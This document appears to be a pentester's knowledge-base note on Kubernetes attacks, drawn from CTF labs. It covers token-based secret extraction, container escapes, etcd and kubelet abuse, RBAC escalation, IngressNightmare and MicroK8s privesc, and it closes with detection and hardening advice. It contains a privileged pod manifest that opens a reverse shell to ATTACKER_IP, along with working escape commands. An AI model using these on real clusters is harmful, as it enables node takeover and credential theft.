---
title: "Kubernetes Attacks"
type: technique
tags: [cloud, exploitation, kubernetes, linux, privilege-escalation, etcd, kubelet, rbac, thm]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-06-17
sources: [thm-linux-kubernetes, 0xdf-containers, wiz-ingressnightmare, projectdiscovery-ingressnightmare]
---

## What It Is

Kubernetes (K8s) is an open-source container orchestration platform that automates deployment, scaling, and management of containerised applications. Understanding its architecture is essential for both attacking and defending environments.

**Core architecture concepts:**

| Component | Role |
|-----------|------|
| **Cluster** | The complete Kubernetes environment: one or more nodes managed by the control plane |
| **Node** | A physical or virtual machine running containerised workloads; includes the kubelet agent and container runtime |
| **Pod** | The smallest deployable unit; one or more containers sharing network and storage |
| **Namespace** | A logical partition of cluster resources for multi-tenancy or isolation |
| **Service** | Exposes pods to the network via a stable DNS name and port (NodePort, ClusterIP, LoadBalancer) |
| **Deployment** | Declarative configuration for managing replica pods; ensures desired state |
| **ReplicaSet** | Maintains a stable number of pod replicas running at any time |
| **ConfigMap / Secret** | Stores configuration and sensitive data (credentials, tokens) — Secrets are base64-encoded, not encrypted by default |
| **ServiceAccount** | An identity a pod can assume to interact with the Kubernetes API |
| **RBAC** | Role-Based Access Control: Roles define permissions (verbs on resources); RoleBindings bind roles to users or service accounts |

**Control plane components (kube-system namespace):**

- `kube-apiserver` — central API gateway; all `kubectl` commands hit this endpoint
- `etcd` — distributed key-value store; holds all cluster state including secrets
- `kube-scheduler` — assigns pods to nodes based on resource availability
- `kube-controller-manager` — runs reconciliation loops to maintain desired state
- `coredns` — cluster-internal DNS resolution
- `kube-proxy` — manages network rules on each node

---

## Attack Surface

Kubernetes environments expose a large attack surface when misconfigured:

- **Exposed API server** — the `kube-apiserver` may be accessible on port 6443 (HTTPS) or 8080 (HTTP, unauthenticated, legacy). Unauthenticated access to port 8080 gives full cluster control.
- **Misconfigured RBAC** — overly permissive roles (`cluster-admin`, wildcard verbs), default service account tokens mounted in every pod, bindings that grant `secrets/get` cluster-wide.
- **Privileged pods** — pods run with `privileged: true`, `hostPID: true`, `hostNetwork: true`, or `hostPath` mounts; any of these can be leveraged for node escape.
- **Secrets in environment variables** — credentials injected via `env:` in pod specs are visible to any process in the container and in `kubectl describe pod` output.
- **Secrets base64-encoded at rest** — Kubernetes Secrets are only base64-encoded by default, not encrypted. Anyone with `etcd` access or `kubectl get secret` permission recovers plaintext.
- **Exposed Docker socket** — mounting `/var/run/docker.sock` into a pod allows full Docker daemon control from within the container.
- **Public image registries** — pulling images from untrusted sources introduces supply-chain risk.
- **Lateral movement between namespaces** — tokens and roles may not be scoped tightly enough, allowing a compromised pod in one namespace to query or control resources in another.

---

## Enumeration

### Cluster-level enumeration with kubectl

```bash
# Check running pods across all namespaces
kubectl get pods -A

# Check pods in a specific namespace
kubectl get pods -n example-namespace

# List all namespaces
kubectl get namespaces

# List all secrets (in default namespace)
kubectl get secrets

# List secrets across all namespaces
kubectl get secrets -A

# Get details of a specific secret
kubectl describe secret terminal-creds

# Decode a base64-encoded secret value
kubectl get secret terminal-creds -o jsonpath='{.data.username}' | base64 --decode
kubectl get secret terminal-creds -o jsonpath='{.data.password}' | base64 --decode

# List all services
kubectl get services -A

# List nodes
kubectl get nodes

# Describe a pod for event logs and container config
kubectl describe pod example-pod -n example-namespace

# View container logs
kubectl logs example-pod -n example-namespace

# Execute a shell inside a running container
kubectl exec -it example-pod -n example-namespace -- sh

# Check RBAC permissions for a service account
kubectl auth can-i get secret/terminal-creds --as=system:serviceaccount:default:terminal-user
```

### Service account token (from within a pod)

Every pod has a service account token mounted at a well-known path. This token can be used to authenticate directly to the Kubernetes API:

```bash
# Token location inside a running container
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# CA certificate
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Namespace the pod belongs to
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use the token to query the API server from within the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets/
```

### Port-forward to access internal services

```bash
# Forward local port 8090 to service port 8080
kubectl port-forward service/example-service 8090:8080
# Access at http://localhost:8090
```

---

## Exploitation

### Token-based API access from a compromised pod

Once inside a container, extract the mounted service account token and query the API server directly. If the service account has permissive RBAC (e.g., cluster-admin or secrets/get), you can enumerate and extract all secrets across the cluster:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# List secrets in default namespace
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets/

# List secrets in all namespaces (requires cluster-level permissions)
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets/
```

### Extracting secrets via kubectl

```bash
# List secret names
kubectl get secrets -n target-namespace

# Retrieve and decode all data fields
kubectl get secret <secret-name> -n target-namespace -o json

# Decode a specific field
kubectl get secret <secret-name> -o jsonpath='{.data.<field>}' | base64 --decode
```

### Lateral movement between namespaces

If a service account token has ClusterRole bindings or broad RoleBindings across namespaces, it can query resources in other namespaces:

```bash
# Query pods in another namespace using a mounted token
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/pods/
```

### Privileged pod abuse

If a pod runs with `privileged: true` or mounts host paths, it may be possible to directly interact with the underlying node filesystem or process table:

```bash
# If hostPath mount is present (e.g., /host maps to /)
ls /host/etc/shadow
chroot /host

# If hostPID is enabled, list host processes
ps aux
```

### Creating a privileged pod (if you have pod create permission)

```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

```bash
kubectl apply -f malicious-pod.yaml
```

---

## Container Escape

A container escape moves attacker execution from inside a container to the underlying host node. Common paths:

**Via privileged container + hostPath mount:**

```bash
# Mount the host root filesystem into the container and chroot into it
chroot /host bash
# Now running as root on the host node
```

**Via Docker socket (if mounted at /var/run/docker.sock):**

```bash
# From inside the container
docker run -it --privileged --pid=host --net=host \
  -v /:/host ubuntu chroot /host bash
```

**Via nsenter (if hostPID is enabled):**

```bash
# Get PID 1 (init on the host)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Via service account token with pod/exec permission:**

If the compromised service account has `pods/exec` permissions, you can exec into any pod in the cluster — including privileged system pods — and pivot from there to the host.

```bash
kubectl exec -it <privileged-system-pod> -n kube-system -- bash
```

### From the Wild — full control plane footprint (HTB, `0xdf-containers`)

**Unobtainium** maps a maximalist on-prem cluster: etcd client/server (`2379`, `2380`), kube-apiserver (`8443`), kubelet (`10250`), and oddball Node ports surfaced together. The foothold storyline chains **Electron app LFI**, **prototype pollution**, and finally **command injection** into a shell before pivoting via recovered **`kubectl` credentials**. Once authenticated, escalate with **privileged pod specs**, **`hostPath`** mounts to the node filesystem, or other cluster-admin equivalents already documented above.

Harvest **`.deb`/package artefacts**, unpacked **Electron ASAR** trees, installer scripts that embed **Kubernetes service tokens**, and developer **kubeconfigs** whenever a product ships its own updater talking to internal clusters.

---

## Advanced Cluster Attacks

### etcd direct access (bypasses RBAC entirely)

`etcd` holds all cluster state, including every Secret (base64-only at rest). If etcd (2379) is reachable, or you recover its client certs from a node (`/etc/kubernetes/pki/etcd/`), you read everything with no API server and no RBAC:

```bash
etcdctl --endpoints=https://<node>:2379 \
  --cacert=ca.crt --cert=etcd.crt --key=etcd.key get / --prefix --keys-only
etcdctl ... get /registry/secrets/default/<name>     # raw Secret, RBAC bypassed
```
etcd access is cluster-admin-equivalent.

### kubelet API (10250)

Each node's kubelet exposes an API that lists and execs into the pods on that node. With `--anonymous-auth=true` it needs no credentials:

```bash
curl -sk https://<node>:10250/pods                   # enumerate pods/containers
kubeletctl -s <node> pods
kubeletctl -s <node> exec "id" -p <pod> -c <container>   # RCE in a node's workload
```
Then read `/var/run/secrets/.../token` from each pod to impersonate its service account.

### RBAC privilege-escalation primitives

Verbs that are effectively cluster-admin:

- `create pods` -> mount any SA and steal its token (token farming), or `privileged`/`hostPath` -> node escape.
- `escalate` / `bind` on roles -> grant yourself more permissions.
- `impersonate` -> `kubectl get secrets -A --as=system:admin`.
- `create` on `serviceaccounts/token` (TokenRequest) -> mint tokens for privileged SAs.
- `update` on `validatingwebhookconfigurations` / `mutatingwebhookconfigurations` -> intercept or mutate cluster requests.

```bash
kubectl auth can-i --list                            # what this identity can do
kubectl who-can create pods -A                        # who holds a dangerous verb (krew)
```

---

## IngressNightmare (CVE-2025-1974, ingress-nginx)

IngressNightmare (Wiz, March 2025) is a vulnerability chain in the Ingress-NGINX Controller for Kubernetes culminating in CVE-2025-1974 (CVSS 9.8): unauthenticated RCE on the ingress controller pod. The admission controller webhook is reachable on the pod network without authentication; a crafted AdmissionReview for an Ingress object injects malicious NGINX configuration directives (via annotations), which the controller renders and loads, executing code in the controller pod. The controller's service account is typically high-privilege, so RCE yields all Kubernetes secrets in its scope and frequently full cluster takeover. Related CVEs: CVE-2025-24513, CVE-2025-24514, CVE-2025-1097, CVE-2025-1098 (annotation-injection variants).

Exploit conditions: the admission webhook endpoint (commonly on the pod network, port 8443) is reachable from a compromised pod, or externally in some exposures. No Ingress create permission is required, because the webhook processes the AdmissionReview directly. Wiz estimated over 40 percent of cloud environments were affected.

Remediation: upgrade Ingress-NGINX to 1.12.1 or 1.11.5+; restrict admission-webhook network reachability with NetworkPolicy so only the API server can reach it; audit the ingress controller's RBAC and service-account scope.

## Detection and Defence

**Detection indicators:**

- `kubectl exec` commands into production pods from unusual source IPs
- API server audit logs showing service account tokens used outside their expected namespace
- Secrets accessed at unusually high rate or from new service accounts
- New pods created with `privileged: true`, `hostPID`, or `hostPath: /`
- Unusual outbound connections from pods (reverse shells)

**Defensive controls:**

| Control | Implementation |
|---------|---------------|
| Restrict API server access | Bind `kube-apiserver` to internal IPs; disable insecure port 8080; require TLS client certificates |
| Least-privilege RBAC | Grant only the specific verbs and resources each service account needs; avoid `cluster-admin` bindings |
| Disable auto-mounting | Set `automountServiceAccountToken: false` on pods that don't need API access |
| Encrypt secrets at rest | Enable encryption providers in the API server configuration for etcd |
| Pod Security Standards | Enforce `restricted` or `baseline` policy via Pod Security Admission; block privileged containers and host namespace sharing |
| Network Policies | Use `NetworkPolicy` resources to restrict pod-to-pod and pod-to-API communication |
| Audit logging | Enable Kubernetes audit logging on the API server; ship logs to a SIEM |
| Image scanning | Scan container images for known CVEs before deployment; use signed images |
| Secrets management | Use external secrets managers (Vault, AWS Secrets Manager) rather than native Kubernetes Secrets |

**RBAC hardening example — restrict secret access to one service account:**

```yaml
# role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: secret-admin
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get"]
  resourceNames: ["terminal-creds"]
---
# role-binding.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: secret-admin-binder
  namespace: default
subjects:
- kind: ServiceAccount
  name: terminal-admin
  namespace: default
roleRef:
  kind: Role
  name: secret-admin
  apiGroup: rbac.authorization.k8s.io
```

```bash
# Verify the restricted account cannot access the secret
kubectl auth can-i get secret/terminal-creds \
  --as=system:serviceaccount:default:terminal-user
# Expected: no

# Verify the permitted account can access it
kubectl auth can-i get secret/terminal-creds \
  --as=system:serviceaccount:default:terminal-admin
# Expected: yes
```

---

## Sources

- TryHackMe — Intro to Kubernetes (`tryhackme.com/room/introtok8s`)
- Kubernetes official documentation: `kubernetes.io/docs/`
- Related pages: [[docker-attacks]], [[cloud-iam-attacks]], [[linux-privesc]]
- `0xdf-containers`: Unobtainium (electron → kube creds → cluster takeover)

## MicroK8s: `microk8s` unix group -> node root (local privesc)

A local user in the **`microk8s`** unix group drives the cluster with **no token**: `microk8s
kubectl` reads the group-readable client config/socket, so an otherwise-unprivileged shell user gets
`kubectl auth can-i create pods` = `yes`. This is a GTFOBins-style group->root, distinct from the
compromised-service-account / RBAC paths above - the entry is unix group membership (`id` shows
`microk8s`), not a stolen SA token.

Fingerprint (nmap): MicroK8s exposes API `16443`, kubelet `10250`, read-only kubelet `10255`,
cluster-agent `25000`, and often a built-in registry `32000`. These ports together = MicroK8s.

Escalate by creating a privileged `hostPath: /` pod (same manifest as the privileged-pod section
above), using a **locally-cached** image so it schedules with no internet pull:

```
# list cached / in-use images WITHOUT root (`microk8s ctr images ls` needs sudo):
microk8s kubectl get pods -A -o jsonpath='{..image}'
# deploy the privileged pod (image = a cached one, e.g. localhost:32000/<img> from the registry):
microk8s kubectl apply -f pwn.yaml
microk8s kubectl exec pwn -- cat /host/root/root.txt   # or drop an SSH key / chroot for a root shell
microk8s kubectl delete pod pwn --grace-period=0 --force   # cleanup
```

<!-- promoted-slug: microk8s-group-privesc -->
